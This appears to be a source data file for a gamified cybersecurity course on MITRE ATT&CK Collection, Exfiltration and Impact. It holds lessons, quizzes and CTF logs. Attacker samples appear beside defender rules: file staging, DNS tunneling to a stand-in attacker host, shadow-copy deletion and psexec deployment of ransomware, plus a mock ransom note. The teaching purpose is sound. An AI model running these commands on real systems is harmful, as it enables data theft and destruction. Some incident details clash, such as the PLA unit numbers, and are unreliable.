  Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-90)} |
  Copy-Item -Destination C:\\Temp\\staging\\

# Compress and encrypt staging directory
7za.exe a -p"C0ll3ct!" C:\\Temp\\data.7z C:\\Temp\\staging\\

# DEFENDER: Detect mass file access (DLP / SIEM rule)
# Alert: single account reads >500 files in <5 minutes
# Alert: 7zip/WinRAR execution from temp directory with password flag`,
        },
      },
      incident: {
        title: "APT29 — M365 Email Collection via Legacy OAuth App (2023–2024)",
        when: "November 2023 – January 2024 (disclosed)",
        where: "Microsoft corporate email environment — senior leadership, security team, legal staff",
        impact: "Microsoft senior leadership emails stolen; CSRB investigation; Microsoft removes all legacy OAuth apps; Microsoft security culture cited by CSRB as contributing factor",
        body: [
          "APT29 (Midnight Blizzard, SVR) read Microsoft's own corporate email through a forgotten test app:\n- A legacy OAuth application carried excessive permissions and was never removed.\n- A password spray took the test account, and its Microsoft Graph API access opened specific mailboxes.",
          "The collection was a targeted counter-intelligence sweep:\n- They queried Graph for terms like 'Midnight Blizzard,' 'Cozy Bear,' and 'APT29' — hunting Microsoft's own reporting about them.\n- That's T1114.002 (Remote Email Collection) plus T1119 (Automated Collection): an API-driven harvest needing no further credential theft.",
          "Microsoft's January 2024 disclosure was unusually candid and consequential:\n- It admitted senior leadership, security, and legal staff emails were accessed, and revoked all over-permissioned legacy OAuth apps.\n- The CSRB's April 2024 report named Microsoft's security culture and legacy architecture as contributing factors, driving the company's 'Secure Future Initiative.'",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT29", sub: "Midnight Blizzard (SVR)", type: "attacker" },
          { label: "Legacy OAuth App", sub: "excessive Graph API permissions", type: "system" },
          { label: "Microsoft Leadership Email", sub: "targeted keyword collection", type: "victim" },
          { label: "Counter-Intel Harvest", sub: "emails about APT29 itself", type: "result" },
        ],
      },
      timeline: [
        { year: 2014, event: "APT29 begins long-term discovery operations against US government" },
        { year: 2020, event: "APT29 maps SolarWinds customer network prior to exfiltration" },
        { year: 2024, event: "Microsoft discloses APT29 email collection via legacy OAuth app", highlight: true },
        { year: 2024, event: "Microsoft revokes all legacy OAuth apps and tightens Graph API permissions" },
      ],
      keyTakeaways: [
        "Discovery uses built-in tools (net.exe, nltest, arp) — monitor process creation for these",
        "Automated collection: alert on >500 file reads in <5 minutes from a single account",
        "Audit OAuth application permissions — legacy apps with excessive Graph API access are high risk",
        "Email keyword searches by unauthorized apps are detectable via Microsoft 365 audit logs",
      ],
      references: [
        { title: "ATT&CK TA0007 Discovery", url: "https://attack.mitre.org/tactics/TA0007/" },
        { title: "Microsoft APT29 Disclosure (Jan 2024)", url: "https://msrc.microsoft.com/blog/2024/01/microsoft-actions-following-attack-by-nation-state-actor-midnight-blizzard/" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-10-q1", type: "Tactic", challenge: "Map then bag.", text: "What's the difference between Discovery and Collection?", options: ["Discovery maps what exists; Collection harvests the valuable data", "They're identical", "Collection comes first", "Both encrypt files"], correctIndex: 0, explanation: "Discovery (TA0007) finds the targets; Collection (TA0009) gathers the data." },
        { id: "mitre-10-q2", type: "Discovery", challenge: "Built-in recon.", text: "Which commands are typical internal Discovery techniques?", options: ["net view /domain, nltest /dclist, arp -a", "vssadmin delete shadows", "certutil -decode", "schtasks /create"], correctIndex: 0, explanation: "These native commands enumerate domain computers and network topology from inside." },
        { id: "mitre-10-q3", type: "Collection", challenge: "Bulk grab.", text: "A script that gathers all recent .docx/.xlsx/.pdf files and zips them is which technique?", options: ["T1119 — Automated Collection", "T1486 — Data Encrypted for Impact", "T1566 — Phishing", "T1003 — Credential Dumping"], correctIndex: 0, explanation: "Automated collection scripts find and stage matching files for exfiltration." },
        { id: "mitre-10-q4", type: "Real Incident", challenge: "APT29 vs Microsoft.", text: "How did APT29 collect Microsoft executives' emails in 2023–2024?", options: ["A legacy OAuth app with excessive Graph permissions (Mail.Read for all users) that was never revoked", "By stealing laptops", "By phoning employees", "By a Windows zero-day"], correctIndex: 0, explanation: "An over-permissioned, forgotten OAuth app gave broad mailbox read access." },
        { id: "mitre-10-q5", type: "Detection", challenge: "Volume anomaly.", text: "Which rule effectively catches automated collection?", options: ["Alert when one account reads >500 files in under 5 minutes", "Alert on any login", "Alert on screensaver activation", "Alert on mouse movement"], correctIndex: 0, explanation: "Bulk, rapid file access by a single account is a reliable collection signal." },
        { id: "mitre-10-q6", type: "Counter-Intel", challenge: "Hunting the hunters.", text: "Why did APT29 search collected emails for terms like 'APT29' and 'Midnight Blizzard'?", options: ["Counter-intelligence — learning what defenders knew about them", "To delete spam", "To improve email speed", "By accident"], correctIndex: 0, explanation: "They harvested intel about the defenders' knowledge of their own operations." },
        { id: "mitre-10-q7", type: "Defense", challenge: "Audit the apps.", text: "What's a key defense against the APT29 email-collection technique?", options: ["Audit and revoke OAuth apps with excessive API permissions", "Use shorter passwords", "Disable email entirely", "Turn off MFA"], correctIndex: 0, explanation: "Legacy apps with broad Graph permissions are high-risk and should be reviewed/removed." },
        { id: "mitre-10-q8", type: "Staging", challenge: "Before the getaway.", text: "How do attackers usually prepare collected data for exfiltration?", options: ["Compress and encrypt it into small archives to avoid DLP alerts", "Print it out", "Email it in plaintext to everyone", "Leave it untouched"], correctIndex: 0, explanation: "Small, compressed, encrypted archives are less likely to trigger detection." },
      ],
    },
    ctf: {
      scenario: "APT29 artifacts were found on a compromised email server. Three collection log files show their discovery and data harvesting operation. Collect the fragments.",
      hint: "Collection artifacts are in /apt29-op. Read each log file.",
      hints: [
        "List /apt29-op to find the operation files.",
        "The discovery log contains the first fragment.",
        "Read collection.log and staging.txt for the remaining fragments.",
      ],
      files: {
        "/apt29-op/discovery.log": `# Network Discovery Log — APT29 Midnight Blizzard

net view /domain → ACME.LOCAL (847 computer objects)
nltest /dclist:acme.local → DC01, DC02, DC03
net group "Domain Admins" /domain → 6 members identified
Identified targets: Exchange servers, SharePoint, file servers

Fragment-1: FLAG{TA0009_`,
        "/apt29-op/collection.log": `# Email Collection Log — Microsoft Graph API

OAuth app: "LegacyTestApp2018" — permissions: Mail.Read (all users)
Query: mailbox:ceo@acme.com keywords:["APT29","Midnight Blizzard","threat actor"]
Results: 847 emails matching keywords
Query: mailbox:ciso@acme.com keywords:["Russia","SVR","Cozy Bear"]
Results: 312 emails matching keywords

Total collected: 1,159 targeted emails

Fragment-2: C0LL3CT_`,
        "/apt29-op/staging.txt": `# Data Staging — Pre-Exfiltration

Collected emails archived: emails.7z (password: xK9#mP2$nQ7!)
Archive size: 247MB (compressed from 1.4GB)
Staging location: C:\\Windows\\Temp\\WinUpdate\\

Exfiltration method: HTTPS to secure-update-cdn.com (attacker C2)
Scheduled: 2024-01-14 02:30 UTC (off-hours, low traffic)

Fragment-3: APT29}`,
      },
      dirs: {
        "/": [{ name: "apt29-op", isDir: true }],
        "/apt29-op": [
          { name: "discovery.log", isDir: false },
          { name: "collection.log", isDir: false },
          { name: "staging.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/apt29-op/discovery.log", value: "FLAG{TA0009_", label: "Fragment 1 — Discovery" },
        { trigger: "/apt29-op/collection.log", value: "C0LL3CT_", label: "Fragment 2 — Collection" },
        { trigger: "/apt29-op/staging.txt", value: "APT29}", label: "Fragment 3 — Staging" },
      ],
    },
  },

  // ─── mitre-11: Exfiltration ───────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Equifax HQ", location: "Atlanta, Georgia", era: "2017", emoji: "📤" },
    id: "mitre-11",
    order: 11,
    title: "The Data Smuggler",
    subtitle: "TA0010 Exfiltration — getting data out without triggering DLP",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-11", name: "Data Smuggler", emoji: "📤" },
    challengeType: "ctf",
    info: {
      tagline: "Collection without exfiltration is a library. Exfiltration is the theft.",
      year: 2017,
      overview: [
        "Exfiltration (TA0010) covers the techniques attackers use to steal collected data from the target network. The challenge for attackers is moving large volumes of data without triggering network DLP, bandwidth monitoring, or anomaly detection systems.",
        "Core techniques: T1048 — Exfiltration Over Alternative Protocol (DNS tunneling, ICMP tunneling, HTTP/S to attacker-controlled domains), T1041 — Exfiltration Over C2 Channel (sending data through the same encrypted channel used for command and control), T1567 — Exfiltration Over Web Service (uploading to Dropbox, Google Drive, or Mega.nz to blend with legitimate cloud traffic).",
        "Exfiltration timing matters: sophisticated actors exfiltrate slowly over days or weeks to stay below anomaly detection thresholds. DNS tunneling can be extremely slow but is almost never blocked by enterprise firewalls — making it the preferred covert channel for long-term exfiltration.",
      ],
      technical: {
        title: "Exfiltration Detection — Network Layer",
        body: [
          "DNS exfiltration detection (T1048.003): DNS queries with unusually long subdomain labels (>50 characters), high query frequency from a single host, queries to domains not seen before by that host, TXT record queries (unusual for workstations). DNS exfiltration tools encode data in subdomain labels: `aGVsbG8gd29ybGQ.c2.attacker.com`.",
          "Volume-based detection: establish a baseline of daily data egress per host. Alert when a host exceeds 2x the historical average egress volume, especially outside business hours. DLP tools detect file type patterns in network traffic (Office document headers, ZIP magic bytes) on encrypted connections via TLS inspection.",
        ],
        codeExample: {
          label: "DNS exfiltration detection",
          code: `# ATTACKER: DNS tunneling exfiltration (iodine, dnscat2)
# Data encoded in subdomain: base32(chunk_of_data).attacker-c2.com
# e.g.: JBSWY3DPEBLW64TMMQQQ.exfil.attacker-ns.com

# DEFENDER: Hunt DNS exfiltration — unusually long query labels
# Zeek DNS log analysis
cat dns.log | awk '{print $10}' | awk -F'.' '{print length($1), $0}' | sort -rn | head -20

# Alert: DNS query subdomain label > 50 chars
# Alert: >1000 DNS queries/hour to same external domain from one host
# Alert: TXT record queries from workstations (rare in legitimate use)

# DEFENDER: SIEM rule — DNS exfiltration
# index=network sourcetype=dns
# | eval subdomain_len=len(mvindex(split(query,"."), 0))
# | where subdomain_len > 50
# | stats count by src_ip, query | where count > 100`,
        },
      },
      incident: {
        title: "Equifax — 76 Days of Exfiltration Undetected (2017)",
        when: "May–July 2017",
        where: "Equifax, Atlanta, Georgia — 147.9 million Americans' consumer credit records",
        impact: "$575M FTC settlement (largest data breach penalty at time); $1.4B total costs; PLA Unit 54938 indicted; SSL inspection becomes mandatory control",
        body: [
          "After exploiting the Apache Struts vulnerability (CVE-2017-5638) in mid-May 2017, attackers exfiltrated data from Equifax's systems over 76 days — nearly two and a half months — before discovery on July 29. The exfiltration went undetected because Equifax's SSL inspection certificate had expired 19 months earlier, making the network monitoring system completely blind to HTTPS-encrypted traffic leaving the network.",
          "The attackers ran 9,000 data queries over 76 days, staged results in small encrypted archives, and exfiltrated through 20 different IP addresses across 20 countries to avoid volume-based detection. The expired SSL certificate was the critical control failure — it turned the network monitoring system from an active defense into a decorative checkbox. The stolen data included names, Social Security numbers, birth dates, addresses, and driver's license numbers for 147.9 million Americans.",
          "The FTC Equifax settlement of $575M — the largest data breach penalty in US history at the time — required Equifax to implement SSL inspection with certificate management controls, mandatory vulnerability scanning with defined remediation timelines, and annual third-party security assessments. DOJ indicted four members of PLA Unit 54938 (linked to the 2015 OPM breach) for the Equifax hack in February 2020 — documenting the attack chain and exfiltration technique in the indictment. SSL inspection became a mandatory control in NIST SP 800-53 rev 5 baselines specifically because Equifax demonstrated that monitoring systems blind to encrypted traffic provide no protection against the vast majority of modern exfiltration, which uses HTTPS. The case is now cited in every major data breach regulatory framework as the canonical example of a monitoring control rendered ineffective by operational neglect.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Unknown Threat Actor", sub: "APT — CVE-2017-5638", type: "attacker" },
          { label: "HTTPS Exfil — 20 IPs", sub: "small chunks, distributed", type: "system" },
          { label: "Equifax Consumer DB", sub: "147.9M Americans' PII", type: "victim" },
          { label: "76-Day Undetected Theft", sub: "expired SSL cert = blind monitoring", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "Equifax breach — 76 days of exfiltration; expired SSL cert enables invisibility", highlight: true },
        { year: 2019, event: "FTC Equifax settlement — $575M largest data breach penalty at the time" },
        { year: 2020, event: "DOJ indicts 4 PLA members for Equifax breach (Unit 61398 linked)" },
        { year: 2022, event: "SSL inspection becomes mandatory control in NIST SP 800-53 baselines" },
      ],
      keyTakeaways: [
        "SSL inspection is a critical exfiltration detection control — expired certs = blind monitoring",
        "DNS tunneling bypasses most firewalls — monitor for long subdomain labels and TXT queries",
        "Equifax exfiltrated for 76 days — baseline egress volume and alert on deviations",
        "Distribute exfiltration across many IPs to evade volume-based detection (as attackers do)",
      ],
      references: [
        { title: "ATT&CK TA0010 Exfiltration", url: "https://attack.mitre.org/tactics/TA0010/" },
        { title: "Equifax FTC Settlement", url: "https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-11-q1", type: "Tactic", challenge: "Getting it out.", text: "What does the Exfiltration tactic (TA0010) cover?", options: ["Stealing collected data out of the target network", "Encrypting files in place", "Gaining initial access", "Buying infrastructure"], correctIndex: 0, explanation: "Exfiltration moves the harvested data to the attacker, ideally without tripping alarms." },
        { id: "mitre-11-q2", type: "Real Incident", challenge: "Equifax, 76 days.", text: "What single control failure let Equifax's exfiltration go undetected for 76 days?", options: ["An SSL inspection certificate had expired 19 months earlier, blinding monitoring to HTTPS", "The building lost power", "Everyone was on vacation", "The data was fake"], correctIndex: 0, explanation: "With SSL inspection down, encrypted exfiltration traffic was invisible to monitoring." },
        { id: "mitre-11-q3", type: "DNS Tunneling", challenge: "The covert channel.", text: "Why is DNS tunneling a favored exfiltration channel?", options: ["DNS is almost always allowed outbound, so it's rarely blocked", "DNS is encrypted by default", "DNS can't carry data", "Firewalls block it by default"], correctIndex: 0, explanation: "Since DNS is permitted nearly everywhere, attackers smuggle data through it." },
        { id: "mitre-11-q4", type: "Detection", challenge: "Spotting DNS exfil.", text: "Which DNS characteristic signals exfiltration?", options: ["Unusually long subdomain labels (>50 chars) containing encoded data", "Short domain names", "Queries to google.com", "Low query volume"], correctIndex: 0, explanation: "Encoded data in long subdomain labels is a hallmark of DNS tunneling." },
        { id: "mitre-11-q5", type: "Evasion", challenge: "Staying under the radar.", text: "Why did Equifax's attackers spread exfiltration across 20 IPs?", options: ["To keep each stream low-volume and evade per-host anomaly thresholds", "To go faster", "To use more bandwidth", "It was accidental"], correctIndex: 0, explanation: "Distributing traffic keeps any single stream below volume-based detection." },
        { id: "mitre-11-q6", type: "Web Services", challenge: "Hiding in plain sight.", text: "Why exfiltrate via Dropbox/Google Drive (T1567)?", options: ["It blends with legitimate cloud traffic and is hard to block without disrupting business", "It's the only option", "It's slower but louder", "It alerts defenders"], correctIndex: 0, explanation: "Popular cloud services are usually allowed, so theft hides among normal usage." },
        { id: "mitre-11-q7", type: "Defense", challenge: "Know your baseline.", text: "What detection approach catches large data theft?", options: ["Baseline each host's egress volume and alert on big deviations", "Ignore outbound traffic", "Only watch inbound traffic", "Disable logging"], correctIndex: 0, explanation: "Egress-volume baselining flags abnormal outbound transfers." },
        { id: "mitre-11-q8", type: "Concept", challenge: "The final theft.", text: "Why is exfiltration the step that turns access into a breach?", options: ["Collection without exfiltration is just staging — exfiltration is the actual theft", "It encrypts the files", "It's optional and harmless", "It only maps the network"], correctIndex: 0, explanation: "'Collection without exfiltration is a library; exfiltration is the theft.'" },
      ],
    },
    ctf: {
      scenario: "Equifax-style breach artifacts show exfiltration in progress. Three log files document the data theft — the SSL blind spot, the chunked exfil, and the detection that came too late. Collect the flag.",
      hint: "Exfiltration logs are in /exfil-op. Read each file.",
      hints: [
        "List /exfil-op to find the log files.",
        "The SSL inspection log reveals the blind spot — and the first fragment.",
        "Read exfil-traffic.log and detection.txt for the remaining fragments.",
      ],
      files: {
        "/exfil-op/ssl-blind-spot.txt": `# SSL Inspection Status Report
# Network Monitoring System — Equifax Corp

SSL Inspection Certificate Status:
  Issuer: DigiCert SSL Inspection CA
  Expiry: 2016-01-15 (EXPIRED — 19 months ago)
  Status: EXPIRED — SSL inspection DISABLED

Impact: All HTTPS traffic (ports 443, 8443) is OPAQUE to monitoring system.
Monitoring system is BLIND to encrypted exfiltration.

Fragment-1: FLAG{TA0010_`,
        "/exfil-op/exfil-traffic.log": `# Reconstructed Exfiltration Traffic (post-incident, from firewall logs)

Date range: 2017-05-13 to 2017-07-29 (76 days)

Destination IPs (20 unique): 195.123.x.x, 94.177.x.x, 185.220.x.x ... [+17 more]
Protocol: HTTPS (port 443) — content was ENCRYPTED (SSL blind spot)
Volume pattern: 200-500MB per day per IP — below single-host anomaly threshold
Total exfiltrated: ~47GB (147.9M records compressed)

Fragment-2: 3XF1L_`,
        "/exfil-op/detection.txt": `# Intrusion Detection Report — July 29, 2017

Detection trigger: Routine network device check flagged unfamiliar binary on ADM portal
IR team investigated → discovered active exfiltration sessions still in progress
Breach duration at detection: 76 days (2017-05-13 to 2017-07-29)

Post-mortem finding: SSL inspection cert expired Jan 2016; not renewed; never caught.
147.9M Americans' data stolen.

Fragment-3: 76D4YS}`,
      },
      dirs: {
        "/": [{ name: "exfil-op", isDir: true }],
        "/exfil-op": [
          { name: "ssl-blind-spot.txt", isDir: false },
          { name: "exfil-traffic.log", isDir: false },
          { name: "detection.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/exfil-op/ssl-blind-spot.txt", value: "FLAG{TA0010_", label: "Fragment 1 — SSL Blind Spot" },
        { trigger: "/exfil-op/exfil-traffic.log", value: "3XF1L_", label: "Fragment 2 — Exfil Traffic" },
        { trigger: "/exfil-op/detection.txt", value: "76D4YS}", label: "Fragment 3 — Detection" },
      ],
    },
  },

  // ─── mitre-12: Impact ─────────────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Kaseya VSA Attack", location: "Miami, Florida", era: "2021", emoji: "💥" },
    id: "mitre-12",
    order: 12,
    title: "The Detonator",
    subtitle: "TA0040 Impact — ransomware deployment at supply chain scale",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-12", name: "ATT&CK Master", emoji: "⚔️" },
    challengeType: "ctf",
    info: {
      tagline: "Impact is the end of the kill chain. For defenders, it is also the beginning of recovery.",
      year: 2021,
      overview: [
        "Impact (TA0040) is the final tactic — the attacker's objective is achieved. Impact techniques include: T1486 — Data Encrypted for Impact (ransomware), T1485 — Data Destruction (wiper malware), T1491 — Defacement, T1498 — Network Denial of Service, T1529 — System Shutdown/Reboot (to trigger damage at scale).",
        "Ransomware (T1486) has become the dominant impact technique because it monetizes access directly. Modern ransomware operations are multi-stage: pre-ransomware reconnaissance and data exfiltration (for double extortion), deployment of the encryptor across all accessible systems simultaneously, and ransom note delivery.",
        "Supply chain ransomware (T1195.002) amplifies impact by targeting managed service providers (MSPs) — a single compromised MSP can propagate ransomware to hundreds of customer organizations simultaneously. Kaseya VSA demonstrated this at scale: one compromised RMM platform, 1,500 downstream victims.",
      ],
      technical: {
        title: "Ransomware Defense — Before and After Encryption",
        body: [
          "Pre-encryption detection: ransomware operators typically exfiltrate data (for double extortion) before encrypting. Large outbound transfers are detectable. The encryption process itself is detectable: high-volume file modification events (Event ID 4663 — file write), file extension changes (.docx → .locked), shadow copy deletion (vssadmin delete shadows /all).",
          "Backup and recovery: the single most effective ransomware defense is immutable backups — backups the ransomware cannot reach or delete. 3-2-1 rule: 3 copies, 2 media types, 1 offsite. Air-gapped or cloud-immutable backups (Azure Blob Storage immutability, AWS S3 Object Lock) survive ransomware because they are inaccessible from the compromised network.",
        ],
        codeExample: {
          label: "Ransomware detection and backup protection",
          code: `# ATTACKER: Shadow copy deletion (pre-encryption, always)
vssadmin.exe delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No

# ATTACKER: Ransomware deployment via PsExec to all discovered hosts
psexec.exe @targets.txt -s cmd.exe /c "C:\\Temp\\encryptor.exe --fast --key <pubkey>"

# DEFENDER: Detect VSS deletion (Event ID 4688 — process creation)
Get-WinEvent -LogName Security | Where-Object {
  $_.Id -eq 4688 -and $_.Message -match "vssadmin.*delete|bcdedit.*recoveryenabled"
}

# DEFENDER: Immutable backups — AWS S3 Object Lock
aws s3api put-bucket-object-lock-configuration \
  --bucket acme-backups-prod \
  --object-lock-configuration '{"ObjectLockEnabled":"Enabled","Rule":{"DefaultRetention":{"Mode":"COMPLIANCE","Days":30}}}'`,
        },
      },
      incident: {
        title: "Kaseya VSA — REvil Supply Chain Ransomware (July 4, 2021)",
        when: "July 2–5, 2021",
        where: "Kaseya VSA (Miami FL) → ~50 MSPs → 1,500 businesses globally across 17 countries",
        impact: "$70M ransom demand; 800 Coop grocery stores closed; Biden-Putin direct call; FBI possessed universal decryption key for 3 weeks before disclosing to victims",
        body: [
          "REvil ransomware operators exploited a zero-day in Kaseya VSA (a Remote Monitoring and Management platform used by managed service providers) to push a malicious 'update' to all VSA-connected agents. The update deployed ransomware to every endpoint managed by approximately 50 MSPs running Kaseya VSA — reaching approximately 1,500 businesses across 17 countries. The attack was timed for July 4th weekend, when IT staff coverage was minimal and change management controls were relaxed.",
          "The ransomware encrypted all files simultaneously across thousands of organizations within hours. Sweden's Coop grocery chain closed 800 stores because their point-of-sale systems ran on a Kaseya-managed MSP. The entire ATT&CK kill chain — from initial Kaseya VSA exploitation (T1195 Supply Chain Compromise) to ransomware detonation (T1486 Data Encrypted for Impact) — executed in under 48 hours. The $70M ransom demand was addressed to Kaseya rather than to individual victims, reflecting the scale of the supply chain compromise.",
          "The Kaseya attack triggered the first direct US government engagement with ransomware operators at the presidential level: President Biden called Russian President Putin on July 9, 2021, specifically raising the Kaseya attack. REvil's infrastructure went offline shortly after — widely attributed to US government offensive action, though never officially acknowledged. The FBI held the universal decryption key for Kaseya victims for three weeks before providing it to Kaseya in late July 2021, generating significant controversy about delayed victim notification. The case accelerated adoption of immutable backup solutions: S3 Object Lock and Azure Immutable Storage deployments grew significantly in the MSP sector in H2 2021, and CISA's StopRansomware guidance expanded to make immutable offline backups a primary recommendation — acknowledging that while prevention was ideal, survivable recovery was essential when prevention failed at the supply chain level.",
        ],
      },
      diagram: {
        nodes: [
          { label: "REvil", sub: "ransomware-as-a-service operator", type: "attacker" },
          { label: "Kaseya VSA Zero-Day", sub: "T1195 supply chain → T1486 ransomware", type: "system" },
          { label: "1,500 Businesses", sub: "50 MSPs × 30 customers each", type: "victim" },
          { label: "$70M Ransom / Global Outage", sub: "Coop 800 stores closed", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "WannaCry — first global ransomware supply chain (NSA EternalBlue)" },
        { year: 2021, event: "Colonial Pipeline — single org ransomware shuts US fuel supply" },
        { year: 2021, event: "Kaseya VSA — supply chain ransomware hits 1,500 orgs simultaneously", highlight: true },
        { year: 2022, event: "CISA releases ransomware guide — backup immutability becomes baseline requirement" },
      ],
      keyTakeaways: [
        "Detect ransomware pre-encryption: VSS deletion, large file writes, extension changes",
        "Immutable backups (S3 Object Lock, Azure Immutable Storage) survive ransomware",
        "Shadow copy deletion (vssadmin delete shadows) is a universal ransomware pre-step — alert on it",
        "MSP supply chain attacks are force multipliers — vet your RMM vendors' security posture",
      ],
      references: [
        { title: "ATT&CK TA0040 Impact", url: "https://attack.mitre.org/tactics/TA0040/" },
        { title: "Kaseya VSA Attack Analysis (CISA)", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-232a" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-12-q1", type: "Tactic", challenge: "The endgame.", text: "What does the Impact tactic (TA0040) represent?", options: ["The attacker achieving their objective — e.g. encrypting, destroying, or disrupting", "The first foothold", "Reconnaissance", "Buying domains"], correctIndex: 0, explanation: "Impact is the final tactic where the damage (ransomware, wipers, DoS) is delivered." },
        { id: "mitre-12-q2", type: "Ransomware", challenge: "The dominant impact.", text: "Which technique is modern ransomware (encrypting victim files)?", options: ["T1486 — Data Encrypted for Impact", "T1566 — Phishing", "T1003 — Credential Dumping", "T1595 — Active Scanning"], correctIndex: 0, explanation: "T1486 covers encrypting data to extort the victim." },
        { id: "mitre-12-q3", type: "Pre-Step", challenge: "Killing recovery first.", text: "Why do ransomware operators run 'vssadmin delete shadows /all' before encrypting?", options: ["To delete Volume Shadow Copies so victims can't easily restore", "To speed up the disk", "To create a backup", "To patch the system"], correctIndex: 0, explanation: "Removing shadow copies eliminates a recovery option; it's detectable via Event ID 4688." },
        { id: "mitre-12-q4", type: "Real Incident", challenge: "Kaseya, July 4 2021.", text: "How did REvil hit ~1,500 businesses at once via Kaseya VSA?", options: ["Compromising the MSP RMM platform to push ransomware downstream (T1195.002 supply chain)", "Phishing each business individually", "A single stolen laptop", "Guessing passwords"], correctIndex: 0, explanation: "One compromised RMM platform propagated ransomware to ~50 MSPs' customers." },
        { id: "mitre-12-q5", type: "Defense", challenge: "Surviving encryption.", text: "Why are immutable backups (e.g. S3 Object Lock in COMPLIANCE mode) effective against ransomware?", options: ["They can't be deleted or overwritten even by admin accounts during retention", "They run faster", "They encrypt the attacker's files", "They block phishing"], correctIndex: 0, explanation: "Immutable backups survive even when attackers gain Domain Admin." },
        { id: "mitre-12-q6", type: "Timing", challenge: "Why holidays?", text: "Why did REvil time the Kaseya attack for the July 4th weekend?", options: ["Reduced IT staffing and slower incident response", "Better internet speeds", "It was random", "Required by the software"], correctIndex: 0, explanation: "Attackers deliberately target holidays/weekends to exploit thin coverage." },
        { id: "mitre-12-q7", type: "Double Extortion", challenge: "Two kinds of pressure.", text: "What is the second layer of 'double extortion' beyond encrypting files?", options: ["Threatening to publish the stolen data if the ransom isn't paid", "Encrypting the files twice", "Deleting the ransom note", "Calling the police"], correctIndex: 0, explanation: "Exfiltrating data first lets attackers also threaten public leaks." },
        { id: "mitre-12-q8", type: "Detection", challenge: "Catch it before encryption.", text: "Which pre-encryption signals help detect ransomware in time?", options: ["VSS deletion, large-volume file writes, and mass file-extension changes", "A user opening a browser", "Low CPU usage", "A successful login"], correctIndex: 0, explanation: "These behaviors precede mass encryption and are detectable warning signs." },
      ],
    },
    ctf: {
      scenario: "REvil ransomware artifacts were recovered from a Kaseya VSA victim. Three files document the final impact phase — VSS deletion, encryption, and the ransom note. Collect the flag to complete the ATT&CK kill chain.",
      hint: "Impact artifacts are in /ransomware-op. Read each file to complete the chain.",
      hints: [
        "List /ransomware-op to find the final artifacts.",
        "The VSS deletion log contains the first fragment.",
        "The ransom note contains the final fragment.",
      ],
      files: {
        "/ransomware-op/vss-deletion.log": `# Pre-Encryption: Shadow Copy Deletion
# Timestamp: 2021-07-02 22:47:13 UTC

vssadmin.exe delete shadows /all /quiet → SUCCESS (all shadow copies deleted)
wmic shadowcopy delete → SUCCESS
bcdedit /set {default} recoveryenabled No → SUCCESS

Recovery options eliminated. Proceeding to encryption.

Fragment-1: FLAG{TA0040_`,
        "/ransomware-op/encryption.log": `# Encryption Phase — REvil Ransomware
# Deployment: Kaseya VSA agent (malicious update package)

Targets: all endpoints managed by VSA agents (1,500 orgs)
Encryption: Salsa20 + RSA-2048 (per-file key encrypted with attacker public key)
Progress:
  [22:49] 50 organizations encrypted
  [22:53] 500 organizations encrypted
  [22:57] 1,500 organizations encrypted

Total encrypted files: ~2.2 billion

Fragment-2: R4NS0M_`,
        "/ransomware-op/ransom-note.txt": `YOUR NETWORK HAS BEEN ENCRYPTED BY REvil

All your files have been encrypted with military grade algorithms.
Without our private key, recovery is impossible.

To recover your files: visit our TOR site
http://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion

Ransom: $70,000,000 USD (Bitcoin)
Payment deadline: 72 hours

Do not attempt to recover files independently — you will corrupt them.

FLAG FRAGMENT: 1MP4CT}
[This is a training simulation — no systems were actually harmed]`,
      },
      dirs: {
        "/": [{ name: "ransomware-op", isDir: true }],
        "/ransomware-op": [
          { name: "vss-deletion.log", isDir: false },
          { name: "encryption.log", isDir: false },
          { name: "ransom-note.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/ransomware-op/vss-deletion.log", value: "FLAG{TA0040_", label: "Fragment 1 — VSS Deletion" },
        { trigger: "/ransomware-op/encryption.log", value: "R4NS0M_", label: "Fragment 2 — Encryption" },
        { trigger: "/ransomware-op/ransom-note.txt", value: "1MP4CT}", label: "Fragment 3 — Ransom Note" },
      ],
    },
  },
];
